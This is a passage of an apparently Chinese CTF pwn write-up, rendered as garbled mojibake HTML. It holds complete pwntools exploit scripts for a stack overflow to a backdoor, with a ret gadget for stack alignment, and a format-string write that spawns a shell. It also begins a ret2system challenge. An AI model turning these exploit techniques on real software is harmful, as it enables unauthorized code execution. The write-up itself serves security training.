	width="639"
	height="134"
	srcset="/p/2025bjtuctf-pwn/8_hu_6d5f4fd2047bad98.png 480w, /p/2025bjtuctf-pwn/8_hu_93eb39e7a14c7484.png 1024w"
	loading="lazy"
	
		alt="BJTUCTFå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="476"
		data-flex-basis="1144px"
	
></p>
<p><img src="/p/2025bjtuctf-pwn/9.png"
	width="870"
	height="459"
	srcset="/p/2025bjtuctf-pwn/9_hu_6273c63034fb752d.png 480w, /p/2025bjtuctf-pwn/9_hu_8202cb61669129d5.png 1024w"
	loading="lazy"
	
		alt="backdoorå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="189"
		data-flex-basis="454px"
	
></p>
<p>æ‰¾åˆ°äº†ä¸€ä¸ªbackdoorå‡½æ•°ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºï¼ˆ0xA+8ï¼Œ64ä½æ¶æ„çš„å¯„å­˜å™¨ebpæ˜¯8å­—èŠ‚å¤§å°ï¼‰è¦†ç›–è¿”å›åœ°å€ï¼Œä½¿æŒ‡é’ˆæŒ‡å‘backdoorçš„systemå‡½æ•°ä»è€Œå¾—åˆ°äº¤äº’æƒé™æ‹¿flagã€‚</p>
<p>å…ˆå†™å‡ºå¤§è‡´expæ¡†æ¶ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = remote(&#39;ip&#39;, port)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;backdoor&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é‚£payloadå°±åº”è¯¥æ˜¯ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>çœ‹åˆ°è¿™é‡Œä½ å¯ä»¥å»å°è¯•ä¸€ä¸‹æ˜¯å¦èƒ½æ‰“é€šï¼Œå‘ç°æ˜¯æŠ¥EOFå´©æºƒçš„(å¦‚<code>SIGSEGV</code>)ã€‚</p>
<p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªç»†èŠ‚ï¼š</p>
<blockquote class="alert alert-tip">
    <blockquote>
<p>64 ä½ç¨‹åºè°ƒç”¨ <code>system</code> éœ€è€ƒè™‘å †æ ˆå¹³è¡¡ï¼Œæœ¬è´¨æ˜¯ <strong>64 ä½ ABI å¯¹ â€œæ ˆå¯¹é½â€ çš„ç¡¬æ€§è¦æ±‚</strong> â€”â€” è‹¥ä¸æ»¡è¶³ï¼Œå‡½æ•°æ‰§è¡Œæ—¶è®¿é—®æ ˆå†…å­˜ä¼šå´©æºƒï¼›è€Œ 32 ä½ ABI æ— æ­¤è¦æ±‚ï¼Œä»…éœ€è°ƒç”¨åæ¸…ç†å‚æ•°æ ˆå³å¯ï¼Œå› æ­¤æ— éœ€é¢å¤–å…³æ³¨å¹³è¡¡ã€‚</p>
<p>å¯¹äºè¿™ä¸ªé˜¶æ®µçš„PWNå­¦ä¹ ï¼Œè¦è¿›ä¸€æ­¥åˆ¤æ–­æ˜¯å¦å †æ ˆå¹³è¡¡ï¼Œéœ€è¦ç”¨åˆ°gdbè°ƒè¯•ï¼Œ16å­—èŠ‚æ±‚ä½™ç­‰æ–¹æ³•å»åˆ¤æ–­ï¼Œæ¯”è¾ƒéš¾ç†è§£ï¼Œç­‰å„ä½åç»­å­¦åˆ°è°ƒç”¨çº¦å®šã€ç¨‹åºæ¶æ„ã€æ ˆå †å°±å¯æ…¢æ…¢ç†è§£ï¼Œå¯¹äºå½“å‰é˜¶æ®µè€Œè¨€åªéœ€è®°å¾—å †æ ˆä¸å¹³è¡¡å°±åŠ ä¸Šretçš„åœ°å€è¿›è¡Œè°ƒå¹³å³å¯ã€‚</p>
</blockquote></blockquote>
<p><code>ret</code>å°±ç›¸å½“äºreturnï¼Œæ‰§è¡Œä¹‹åå°±ä¼šè¿”å›â€œèµ·ç‚¹â€ï¼Œç›¸å½“äºä¸€æ¬¡æ ¡æ­£ï¼Œæ€•ä½ èµ°æ­ªï¼Œä¸ç„¶ä½ åç»­æ‰§è¡Œç¨‹åºå°±ä¼šå¼•å‘å´©æºƒã€‚</p>
<p>æ‰€ä»¥è¯´ expçš„payload éœ€è¦è€ƒè™‘åˆ°å †æ ˆå¹³è¡¡åŠ ä¸Š ret æŒ‡ä»¤ç‰‡æ®µçš„è¿”å›åœ°å€ï¼š</p>
<p>è¿™é‡Œæˆ‘ä»¬ç”¨ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary ./pwn3 <span class="p">|</span> grep ret
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/2025bjtuctf-pwn/10.png"
	width="925"
	height="399"
	srcset="/p/2025bjtuctf-pwn/10_hu_ced0c5ce2693656a.png 480w, /p/2025bjtuctf-pwn/10_hu_8b529ff60357d5d0.png 1024w"
	loading="lazy"
	
		alt="ROPgadgetæŸ¥è¯¢"
	
	
		class="gallery-image" 
		data-flex-grow="231"
		data-flex-basis="556px"
	
></p>
<p>æ‰€ä»¥ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x000000000040101a</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ ¹æ®å´©æºƒæƒ…å†µåæ¨ï¼šå¦‚æœå»æ‰<code>ret</code>åç¨‹åºå´©æºƒï¼ˆå¦‚æŠ¥<code>SIGSEGV</code>ï¼‰ï¼Œä½†åŠ ä¸Š<code>ret</code>åæ­£å¸¸æ‰§è¡Œï¼Œé‚£å°±è¯´æ˜éœ€è¦å †æ ˆå¹³è¡¡ï¼Œè¿™å°±æ˜¯64æ¶æ„çš„ä¸åŒä¹‹å¤„ã€‚</p>
<p>å®Œæ•´ç‰ˆexpï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = remote(&#39;ip&#39;, port)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;backdoor&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x000000000040101a</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn4">pwn4
</h3><p><a class="link" href="pwn4" >pwn4</a></p>
<p>è¿™é¢˜åˆæ­¥è€ƒå¯Ÿäº†æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚</p>
<p>checksecä¸€ä¸‹ï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/11.png"
	width="630"
	height="184"
	srcset="/p/2025bjtuctf-pwn/11_hu_f8f6ec93c85051e7.png 480w, /p/2025bjtuctf-pwn/11_hu_737072a1584b3635.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="342"
		data-flex-basis="821px"
	
></p>
<p>32ä½å…³é—­PIEï¼Œéƒ¨åˆ†å¼€å¯RELROï¼Œå¼€å¯äº†canaryä¿æŠ¤ï¼Œæ„å‘³ç€ä¸èƒ½ç”¨æ ˆæº¢å‡ºé‚£ä¸€å¥—æ–¹æ³•äº†ã€‚ğŸ˜„</p>
<p>IDA</p>
<p>32ä½åˆ†æï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/12.png"
	width="955"
	height="525"
	srcset="/p/2025bjtuctf-pwn/12_hu_ef42491669d7d3d2.png 480w, /p/2025bjtuctf-pwn/12_hu_fd85ddc888194df9.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="181"
		data-flex-basis="436px"
	
></p>
<p>ä»mainå‡½æ•°å¯ä»¥çœ‹åˆ°å½“Expl0rer = 6 çš„æ—¶å€™å³å¯è·çš„ä¸€ä¸ªshellã€‚</p>
<p>åŒå‡»BJTUCTFå‡½æ•°è·Ÿè¿›æŸ¥çœ‹ï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/13.png"
	width="815"
	height="306"
	srcset="/p/2025bjtuctf-pwn/13_hu_6147cf39ad5d6769.png 480w, /p/2025bjtuctf-pwn/13_hu_c431c03d9858a560.png 1024w"
	loading="lazy"
	
		alt="BJTUCTFå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="266"
		data-flex-basis="639px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„ptintf(s)æ˜æ˜¾çš„å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œç¬¬ä¸€æ¬¡æ¥è§¦ï¼Œä¸çŸ¥é“ä¸ºå•¥è¿™é‡Œå°±å­˜åœ¨æ¼æ´ï¼Ÿåˆ«æ€¥åé¢ä¼šé€æ­¥è®²è§£ã€‚</p>
<p>é¦–å…ˆå°†æ•°ç»„såˆå§‹åŒ–ä¸º0ï¼Œæ¸…é™¤æ•°ç»„ä¸­çš„å†…å®¹ï¼Œç„¶åè¯»å–0x50çš„æ•°æ®åˆ°å­—ç¬¦æ•°ç»„sä¸­ã€‚</p>
<p><code>printf(s); </code>ä½¿ç”¨ç”¨æˆ·è¾“å…¥çš„å†…å®¹ä½œä¸ºæ ¼å¼å­—ç¬¦ä¸²ï¼Œè¿›è¡Œ printf è¾“å‡ºã€‚è¿™é‡Œå­˜åœ¨æ ¼å¼å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆç®€å•å°è¯•ä¸€ä¸‹ï¼Œå…ˆæ­£å¸¸è¾“å…¥å­—ç¬¦ï¼Œçœ‹èµ·æ¥æ²¡æœ‰é—®é¢˜ï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/14.png"
	width="1070"
	height="483"
	srcset="/p/2025bjtuctf-pwn/14_hu_2a66ca4a2eb2c38d.png 480w, /p/2025bjtuctf-pwn/14_hu_a279520a933b75b7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="221"
		data-flex-basis="531px"
	
></p>
<p>ä½†æ˜¯å½“æˆ‘ä»¬è¾“å…¥ç‰¹æ®Šçš„æ ¼å¼å­—ç¬¦æ—¶å€™ä¼šè¾“å‡ºç‰¹å®šçš„å†…å®¹ï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/15.png"
	width="1059"
	height="480"
	srcset="/p/2025bjtuctf-pwn/15_hu_36cceb34c8ae297d.png 480w, /p/2025bjtuctf-pwn/15_hu_6d9881755de92f4.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="220"
		data-flex-basis="529px"
	
></p>
<p>è¿è¡Œäº†å¤šæ¬¡ï¼Œå‘ç°ä¸‹é¢è¿™ä¸²åœ°å€æ˜¯éšæœºåŒ–çš„ã€‚</p>
<blockquote class="alert alert-note">
    <blockquote>
<p>åœ¨ C è¯­è¨€ä¸­ï¼Œ<code>%x</code> æ˜¯ <code>printf</code> ç­‰æ ¼å¼åŒ–è¾“å‡ºå‡½æ•°çš„<strong>æ ¼å¼æ§åˆ¶ç¬¦</strong>ï¼Œç”¨äºå°†æ•´æ•°ä»¥<strong>åå…­è¿›åˆ¶ï¼ˆå°å†™å­—æ¯ï¼‰</strong> çš„å½¢å¼è¾“å‡ºã€‚</p>
<p>è¾“å…¥ <code>%x.%x.%x</code>ï¼Œå¯èƒ½ä¼šè¾“å‡ºç±»ä¼¼ <code>bffff3a0.8048520.1</code> çš„ç»“æœï¼Œè¿™äº›å°±æ˜¯æ ˆä¸Šä¸åŒä½ç½®çš„æ•°æ®ï¼ˆå…·ä½“å€¼å–å†³äºç¨‹åºè¿è¡Œæ—¶çš„æ ˆçŠ¶æ€ï¼‰ã€‚</p>
<p>è¿™ç§ç‰¹æ€§ä½¿å¾— <code>%x</code> æˆä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¸­æ³„éœ²å†…å­˜ä¿¡æ¯çš„å¸¸ç”¨å·¥å…·ã€‚</p>
</blockquote></blockquote>
<p>å¤šæå‡ ä¸ª%xçœ‹çœ‹ï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/16.png"
	width="980"
	height="485"
	srcset="/p/2025bjtuctf-pwn/16_hu_27cdf34b883252a3.png 480w, /p/2025bjtuctf-pwn/16_hu_95dc6b32c870ca94.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="202"
		data-flex-basis="484px"
	
></p>
<p>æˆ‘è¯•äº†å¥½å‡ æ¬¡éƒ½ä¸è¡Œï¼Œå†æ¥ä¸€æ¬¡ï¼Œæ¢æˆAAAAæ›´æ˜æ˜¾ğŸ˜”ï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/17.png"
	width="1440"
	height="505"
	srcset="/p/2025bjtuctf-pwn/17_hu_13fa8aa69302c6b8.png 480w, /p/2025bjtuctf-pwn/17_hu_a288555caf839288.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="285"
		data-flex-basis="684px"
	
></p>
<p>ç»ˆäºæ‰¾åˆ°äº†ï¼Œåç§»é‡ä¸º7ï¼Œå› ä¸ºæ˜¯å°ç«¯åºï¼Œä¸¤ä½å­—æ¯ä¸ºä¸€ä¸ªå•ä½ä»å³åˆ°å·¦æ’çš„ï¼Œæ‰€ä»¥æ¯”è¾ƒéš¾è¾¨è®¤ï¼Œå½“ç„¶ç”¨BJTUä¹Ÿè¡Œï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/18.png"
	width="1441"
	height="503"
	srcset="/p/2025bjtuctf-pwn/18_hu_87ea606e0e7d6d43.png 480w, /p/2025bjtuctf-pwn/18_hu_da85974af7d19811.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="286"
		data-flex-basis="687px"
	
></p>
<blockquote>
<p>â€œBJTUâ€ å¯¹åº”çš„åå…­è¿›åˆ¶ï¼ˆæŒ‰å­—ç¬¦ä¾æ¬¡è½¬æ¢ï¼‰ä¸º <code>0x42 0x4A 0x54 0x55</code>ï¼Œç»†å¿ƒä¸€ç‚¹å°±èƒ½çœ‹å‡ºæ¥äº†ã€‚</p>
</blockquote>
<p>è¿™ä¸ªåç§»é‡æ˜¯7ä¸ºå·§åˆï¼Ÿå¯ä»¥è¿›è¡ŒéªŒè¯ä¸€ä¸‹ï¼Œåˆ†åˆ«ç”¨æŒ‡ä»¤<code>%7$p</code>ã€<code>%7$x</code>ï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/19.png"
	width="1030"
	height="475"
	srcset="/p/2025bjtuctf-pwn/19_hu_d022bcc093039f36.png 480w, /p/2025bjtuctf-pwn/19_hu_8e8694d911187de1.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="216"
		data-flex-basis="520px"
	
></p>
<p><img src="/p/2025bjtuctf-pwn/20.png"
	width="925"
	height="480"
	srcset="/p/2025bjtuctf-pwn/20_hu_5cee9725565e0ed.png 480w, /p/2025bjtuctf-pwn/20_hu_6ca407fd182854ad.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="192"
		data-flex-basis="462px"
	
></p>
<p>æˆ‘ä»¬éœ€è¦è®©Expl0rer = 6ï¼Œç°åœ¨åˆæœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å…¶ä»»æ„åœ°å€å†™åŠŸèƒ½å°†Expl0rerçš„å€¼ä¿®æ”¹ä¸º6å³å¯è·å¾—shellã€‚</p>
<p>è¿™é‡Œä½¿ç”¨pwntoolsæ¨¡å—ä¸­çš„fmtstræ¨¡å—ç›´æ¥è¿›è¡Œæ”¹å†™ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,{</span><span class="n">daniu</span><span class="p">:</span><span class="mi">6</span><span class="p">})</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å®Œæ•´expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn4&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = remote(&#39;ip&#39;,port)</span>
</span></span><span class="line"><span class="cl"><span class="n">Expl0rer</span> <span class="o">=</span> <span class="mh">0x804C060</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,{</span><span class="n">Expl0rer</span><span class="p">:</span><span class="mi">6</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn5">pwn5
</h3><p><a class="link" href="pwn5" >pwn5</a></p>
<blockquote class="alert alert-error">
    <blockquote>
<p>è¿™é¢˜å¯¹äºPWNå…¥é—¨æ‰‹æ¥è¯´æœ€å¤§ä¸€ä¸ªå¼±ç‚¹æ˜¯è¿‡åº¦ä¾èµ–IDAï¼Œå…¶å®è¿™æ˜¯ä¸€ä¸ªç¼“å†²åŒºæ˜¯ä¸€ä¸ªåŠ¨æ€åˆ†é…ï¼Œæˆ‘ä»¬éœ€è¦æ­é…pwngdbã€pwndbgå»è°ƒè¯•ï¼Œå¾—å‡ºçœŸå®çš„ç¼“å†²åŒºã€‚</p>
</blockquote></blockquote>
<p>checksecï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/21.png"
	width="838"
	height="205"
	srcset="/p/2025bjtuctf-pwn/21_hu_68058d02dab89aee.png 480w, /p/2025bjtuctf-pwn/21_hu_b8dd84e413fe383e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="408"
		data-flex-basis="981px"
	
></p>
<p>32ä½å…³canaryã€PIEä¿æŠ¤ï¼Œå¼€NXä¿æŠ¤ã€‚</p>
<p>IDA32ä½åˆ†æï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/22.png"
	width="770"
	height="225"
	srcset="/p/2025bjtuctf-pwn/22_hu_31350aa94e570d0e.png 480w, /p/2025bjtuctf-pwn/22_hu_d98c27d0b266390e.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="342"
		data-flex-basis="821px"
	
></p>
<p>mainå‡½æ•°è¿™å¾ˆæ˜æ˜¾æœ‰ä¸ªæ ˆæº¢å‡ºæ¼æ´ï¼Œ0x64+4å°±èƒ½è¦†ç›–ã€‚</p>
<p>åœ¨æ±‡ç¼–ä»£ç å—è¿™çœ‹åˆ°äº†ä¸ª<code>_system</code>ï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/23.png"
	width="1323"
	height="419"
	srcset="/p/2025bjtuctf-pwn/23_hu_b4e1de38e986ebc8.png 480w, /p/2025bjtuctf-pwn/23_hu_68f326f070d4a86.png 1024w"
	loading="lazy"
	
		alt="secureå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="315"
		data-flex-basis="757px"
	
></p>
<p><img src="/p/2025bjtuctf-pwn/24.png"
	width="595"
	height="119"
	srcset="/p/2025bjtuctf-pwn/24_hu_10d70919852f1cc5.png 480w, /p/2025bjtuctf-pwn/24_hu_ff20a8c3dfec13d5.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="500"
		data-flex-basis="1200px"
	
></p>
<p>å…¨å±€æœç´¢äº†ä¸‹ï¼Œæ²¡æœ‰çœ‹åˆ°/bin/shã€‚</p>
<p>é¡ºä¾¿æœç´¢äº†systemï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/25.png"
	width="1328"
	height="239"
	srcset="/p/2025bjtuctf-pwn/25_hu_7d8d9dad3a31f818.png 480w, /p/2025bjtuctf-pwn/25_hu_34ed41b13a8082cf.png 1024w"
	loading="lazy"
	
		alt="system"
	
	
		class="gallery-image" 
		data-flex-grow="555"
		data-flex-basis="1333px"
	
></p>
<p>æ¥ç€æˆ‘ä»¬éœ€è¦é€šè¿‡getså‡½æ•°æ‰‹åŠ¨å†™å…¥/bin/shå­—ç¬¦ä¸²åˆ°ä¸€ä¸ªå¯å†™å¯æ‰§è¡ŒåŒºåŸŸï¼Œé€šå¸¸åœ¨bssæ®µï¼Œåœ¨idaæ‰¾åˆ°ä¸€ä¸ªåœ°å€ã€‚</p>
<p><img src="/p/2025bjtuctf-pwn/26.png"
	width="1050"
	height="360"
	srcset="/p/2025bjtuctf-pwn/26_hu_3a823adaf7a38252.png 480w, /p/2025bjtuctf-pwn/26_hu_9ea7ee49143a66fb.png 1024w"
	loading="lazy"
	
		alt="bsså­—æ®µ"
	
	
		class="gallery-image" 
		data-flex-grow="291"
		data-flex-basis="700px"
	
></p>
<blockquote class="alert alert-warn">
    <blockquote>
<p>ä¸ºä»€ä¹ˆè¦å†™å…¥bsså†…å­˜å­—æ®µï¼Ÿç›´æ¥ç»™systemå‡½æ•°å‹è¿›ä¸€ä¸ªå­—ç¬¦ä¸²<code>/bin/sh</code>ä½œä¸ºå˜é‡ä¸å°±å¯ä»¥äº†å—ï¼Ÿè¿™æˆ‘å½“åˆä¹Ÿè¿™ä¹ˆæƒ³ï¼Œå…¶å®ä¸ç„¶ï¼š</p>
<p><strong>BSS æ®µçš„ç‰¹æ€§</strong>ï¼šBSSï¼ˆBlock Started by Symbolï¼‰æ®µé€šå¸¸ç”¨äºå­˜å‚¨æœªåˆå§‹åŒ–æˆ–åˆå§‹åŒ–ä¸º 0 çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ã€‚å®ƒåœ¨ç¨‹åºåŠ è½½æ—¶å°±å·²ç»åˆ†é…å¥½äº†å›ºå®šçš„å†…å­˜ç©ºé—´ï¼Œ å¹¶ä¸”åœ¨ç¨‹åºçš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…ï¼Œè¿™å—å†…å­˜åŒºåŸŸçš„åœ°å€æ˜¯ç›¸å¯¹ç¨³å®šçš„ã€‚å°†<code>/bin/sh</code>å†™å…¥ BSS æ®µï¼Œå¯ä»¥ä¿è¯å­—ç¬¦ä¸²åœ¨éœ€è¦ä½¿ç”¨æ—¶ï¼Œå…¶å†…å®¹ä¸ä¼šè¢«æ„å¤–ä¿®æ”¹ï¼Œä»è€Œç¡®ä¿<code>system</code>å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è·å–åˆ°å‚æ•°ã€‚</p>
